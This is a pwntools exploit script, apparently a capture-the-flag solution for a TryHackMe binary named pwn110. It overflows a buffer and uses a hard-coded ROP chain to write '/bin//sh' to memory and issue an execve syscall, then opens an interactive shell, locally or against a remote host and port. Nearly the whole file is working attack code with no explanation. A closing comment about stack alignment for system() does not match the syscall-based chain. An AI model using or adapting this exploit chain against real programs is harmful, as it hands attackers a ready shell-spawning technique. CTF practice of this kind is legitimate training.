from pwn import *
from pwnlib.fmtstr import FmtStr, fmtstr_split, fmtstr_payload
import time
from struct import pack

# Allows you to switch between local/GDB/remote from terminal
def start(argv=[], *a, **kw):
    if args.GDB:  # Set GDBscript below
        return gdb.debug([exe] + argv, gdbscript=gdbscript, *a, **kw)
    elif args.REMOTE:  # ('server', 'port')
        return remote(sys.argv[1], sys.argv[2], *a, **kw)
    else:  # Run locally
        return process([exe] + argv, *a, **kw)


# Specify your GDB script here for debugging
gdbscript = '''
init-pwndbg
continue
'''.format(**locals())


# Set up pwntools for the correct architecture
exe = "/home/b0x41s/ctf/thm/PWN101/thm/pwn110 - ROP/pwn110"
# This will automatically get context arch, bits, os etc
elf = context.binary = ELF(exe, checksec=False)
# Enable verbose logging so we can see exactly what is being sent (info/debug)
context.log_level = 'debug'

# ===========================================================
#                    EXPLOIT GOES HERE
# ===========================================================

io = start()

p = b'a'*(40)
p += pack('<Q', 0x000000000040f4de) # pop rsi ; ret
p += pack('<Q', 0x00000000004c00e0) # @ .data
p += pack('<Q', 0x00000000004497d7) # pop rax ; ret
p += b'/bin//sh'
p += pack('<Q', 0x000000000047bcf5) # mov qword ptr [rsi], rax ; ret
p += pack('<Q', 0x000000000040f4de) # pop rsi ; ret
p += pack('<Q', 0x00000000004c00e8) # @ .data + 8
p += pack('<Q', 0x0000000000443e30) # xor rax, rax ; ret
p += pack('<Q', 0x000000000047bcf5) # mov qword ptr [rsi], rax ; ret
p += pack('<Q', 0x000000000040191a) # pop rdi ; ret
p += pack('<Q', 0x00000000004c00e0) # @ .data
p += pack('<Q', 0x000000000040f4de) # pop rsi ; ret
p += pack('<Q', 0x00000000004c00e8) # @ .data + 8
p += pack('<Q', 0x000000000040181f) # pop rdx ; ret
p += pack('<Q', 0x00000000004c00e8) # @ .data + 8
p += pack('<Q', 0x0000000000443e30) # xor rax, rax ; ret
p += pack('<Q', 0x0000000000470d20) # add rax, 1 ; ret
p += pack('<Q', 0x0000000000470d20) # add rax, 1 ; ret
p += pack('<Q', 0x0000000000470d20) # add rax, 1 ; ret
p += pack('<Q', 0x0000000000470d20) # add rax, 1 ; ret
p += pack('<Q', 0x0000000000470d20) # add rax, 1 ; ret
p += pack('<Q', 0x0000000000470d20) # add rax, 1 ; ret
p += pack('<Q', 0x0000000000470d20) # add rax, 1 ; ret
p += pack('<Q', 0x0000000000470d20) # add rax, 1 ; ret
p += pack('<Q', 0x0000000000470d20) # add rax, 1 ; ret
p += pack('<Q', 0x0000000000470d20) # add rax, 1 ; ret
p += pack('<Q', 0x0000000000470d20) # add rax, 1 ; ret
p += pack('<Q', 0x0000000000470d20) # add rax, 1 ; ret
p += pack('<Q', 0x0000000000470d20) # add rax, 1 ; ret
p += pack('<Q', 0x0000000000470d20) # add rax, 1 ; ret
p += pack('<Q', 0x0000000000470d20) # add rax, 1 ; ret
p += pack('<Q', 0x0000000000470d20) # add rax, 1 ; ret
p += pack('<Q', 0x0000000000470d20) # add rax, 1 ; ret
p += pack('<Q', 0x0000000000470d20) # add rax, 1 ; ret
p += pack('<Q', 0x0000000000470d20) # add rax, 1 ; ret
p += pack('<Q', 0x0000000000470d20) # add rax, 1 ; ret
p += pack('<Q', 0x0000000000470d20) # add rax, 1 ; ret
p += pack('<Q', 0x0000000000470d20) # add rax, 1 ; ret
p += pack('<Q', 0x0000000000470d20) # add rax, 1 ; ret
p += pack('<Q', 0x0000000000470d20) # add rax, 1 ; ret
p += pack('<Q', 0x0000000000470d20) # add rax, 1 ; ret
p += pack('<Q', 0x0000000000470d20) # add rax, 1 ; ret
p += pack('<Q', 0x0000000000470d20) # add rax, 1 ; ret
p += pack('<Q', 0x0000000000470d20) # add rax, 1 ; ret
p += pack('<Q', 0x0000000000470d20) # add rax, 1 ; ret
p += pack('<Q', 0x0000000000470d20) # add rax, 1 ; ret
p += pack('<Q', 0x0000000000470d20) # add rax, 1 ; ret
p += pack('<Q', 0x0000000000470d20) # add rax, 1 ; ret
p += pack('<Q', 0x0000000000470d20) # add rax, 1 ; ret
p += pack('<Q', 0x0000000000470d20) # add rax, 1 ; ret
p += pack('<Q', 0x0000000000470d20) # add rax, 1 ; ret
p += pack('<Q', 0x0000000000470d20) # add rax, 1 ; ret
p += pack('<Q', 0x0000000000470d20) # add rax, 1 ; ret
p += pack('<Q', 0x0000000000470d20) # add rax, 1 ; ret
p += pack('<Q', 0x0000000000470d20) # add rax, 1 ; ret
p += pack('<Q', 0x0000000000470d20) # add rax, 1 ; ret
p += pack('<Q', 0x0000000000470d20) # add rax, 1 ; ret
p += pack('<Q', 0x0000000000470d20) # add rax, 1 ; ret
p += pack('<Q', 0x0000000000470d20) # add rax, 1 ; ret
p += pack('<Q', 0x0000000000470d20) # add rax, 1 ; ret
p += pack('<Q', 0x0000000000470d20) # add rax, 1 ; ret
p += pack('<Q', 0x0000000000470d20) # add rax, 1 ; ret
p += pack('<Q', 0x0000000000470d20) # add rax, 1 ; ret
p += pack('<Q', 0x0000000000470d20) # add rax, 1 ; ret
p += pack('<Q', 0x0000000000470d20) # add rax, 1 ; ret
p += pack('<Q', 0x0000000000470d20) # add rax, 1 ; ret
p += pack('<Q', 0x0000000000470d20) # add rax, 1 ; ret
p += pack('<Q', 0x0000000000470d20) # add rax, 1 ; ret
p += pack('<Q', 0x0000000000470d20) # add rax, 1 ; ret
p += pack('<Q', 0x0000000000470d20) # add rax, 1 ; ret
p += pack('<Q', 0x0000000000470d20) # add rax, 1 ; ret
p += pack('<Q', 0x0000000000470d20) # add rax, 1 ; ret
p += pack('<Q', 0x0000000000470d20) # add rax, 1 ; ret
p += pack('<Q', 0x0000000000470d20) # add rax, 1 ; ret
p += pack('<Q', 0x0000000000470d20) # add rax, 1 ; ret
p += pack('<Q', 0x00000000004012d3) # syscall




# payload = flat(
#     padding,
#     p
# )

# Note: One caveat with the exploit is that we need to add an extra ROP gadget 
# with a ret to make sure the stack is 64bit aligned. 
# On most amd64 Linux distributions, glibc uses the SSE instruction set
# which expects the stack to be aligned on a 16-byte boundary or a general-protection exception (#GP) 
# will be generated. An example of such instruction is movaps, which is actually used somewhere in system() .

io.sendline(p)

io.interactive()